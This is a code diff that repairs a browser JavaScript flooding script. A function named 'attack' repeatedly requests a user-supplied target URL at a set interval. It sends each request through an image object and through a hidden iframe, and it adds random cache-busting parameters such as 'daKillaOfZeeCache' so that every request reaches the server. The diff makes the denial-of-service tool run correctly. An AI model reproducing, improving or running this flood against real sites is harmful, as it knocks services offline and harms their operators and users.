@@ -1,18 +1,21 @@
-var target = prompt("Image Url, add / to the end");
-var speed = prompt("Make request ever [blank] miliseconds");
+var target = prompt("Enter the full Image URL, including https:// and add / to the end");
+var speed = parseInt(prompt("Make request every [blank] milliseconds"));
 var msg = prompt("Message to HTTP server");
 
 function attack() {  
   var pic = new Image();
-  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
-  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
-  pic.src = 'http://'+target+"/?r="+rand;
-    
-    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
+  var rand1 = Math.floor(Math.random() * 99999999999999999999);
+  var rand2 = Math.floor(Math.random() * 99999999999999999999);
   
+  // Construct the URL with HTTPS
+  var url = target + "?r=" + rand1 + "&msg=" + encodeURIComponent(msg);
+  pic.src = url;
 
-                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
-					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
-
+  // Add an iframe with a unique source to bypass cache
+  document.body.innerHTML += '<iframe src="' + target + '?daKillaOfZeeCache=' + rand2 + '&msg=' + encodeURIComponent(msg) + '" style="display:none;"></iframe>';
+  
+  pic.onload = function () { console.log("Request succeeded for: " + url); };
+  pic.onerror = function () { console.log("Request failed for: " + url); };
 }
-setInterval(attack, speed);  
+
+setInterval(attack, speed);
